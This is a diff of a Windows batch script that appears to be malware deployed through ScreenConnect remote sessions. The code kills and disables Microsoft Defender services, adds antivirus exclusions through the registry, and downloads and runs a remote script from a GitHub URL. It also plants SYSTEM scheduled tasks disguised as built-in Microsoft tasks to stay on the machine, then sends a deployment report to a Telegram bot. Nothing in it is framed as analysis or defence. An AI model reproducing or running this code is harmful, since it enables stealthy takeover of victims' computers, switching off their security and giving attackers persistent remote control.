@@ -14,7 +14,7 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 
 REM Survive ScreenConnect Guest 30s kill: detach into independent process
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O6 ===
+  echo === OWN BUILD 20260802O7 ===
   net session >nul 2>&1
   if errorlevel 1 (echo need Administrator & exit /b 5)
   echo go_start %DATE% %TIME%>"%LOG%"
@@ -31,21 +31,13 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O6 ===
+echo === OWN WORKER 20260802O7 ===
 
-echo [1] Defender reg only (no sc stop hang)...
+echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
 echo av_reg_begin>>"%LOG%"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "curl.exe" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
+if not exist "%WD%\own_secure.cmd" curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd" >nul 2>&1
+if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
 REM fire-and-forget only - sc stop WinDefend hangs forever on locked hosts
 start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
 echo av_fight_done>>"%LOG%"
@@ -175,6 +167,11 @@ schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGH
 schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
 schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
 echo persist_armed_wipeproof>>"%LOG%"
+
+echo [5b] Re-lock persist dirs/tasks/SC after arm...
+if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
+if not exist "%WD%\own_secure.cmd" curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd" >nul 2>&1
+if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
 
 echo [6] First-deploy Telegram report...
 REM bootstrap notify.cfg if missing (ops bot; do not commit notify.cfg as a file)
